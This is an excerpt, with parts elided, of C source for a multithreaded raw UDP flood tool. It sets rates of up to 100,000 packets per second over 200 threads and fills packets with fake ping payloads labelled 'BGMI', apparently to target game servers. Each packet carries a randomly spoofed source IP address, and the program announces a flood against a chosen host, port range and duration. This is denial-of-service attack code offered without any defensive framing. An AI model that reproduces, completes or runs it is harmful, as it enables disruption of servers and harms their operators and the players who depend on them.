...
#define MAX_PACKETS_PER_SEC 100000 // Push VPS limits
#define NUM_THREADS 200       // Double threads for VPS
...
void *thread_flood(void *arg) {
    ...
    snprintf(data, PACKET_SIZE, "\xFF\xFF\xFF\xFFBGMI:Player%d:Ping:%d", 
             rand() % 1000, rand() % 1000);
    ...
    while (time(NULL) - start_time < args->duration) {
        for (int i = 0; i < MAX_PACKETS_PER_SEC / NUM_THREADS; i++) {
            ...
            iph->saddr = htonl(rand()); // Full random IP (0.0.0.0 - 255.255.255.255)
        ...
        usleep(10); // Minimal sleep for max throughput
    }
...
int main(int argc, char *argv[]) {
    ...
    printf("Starting raw UDP flood on %s:%d-%d for %d seconds with %d threads\n", 
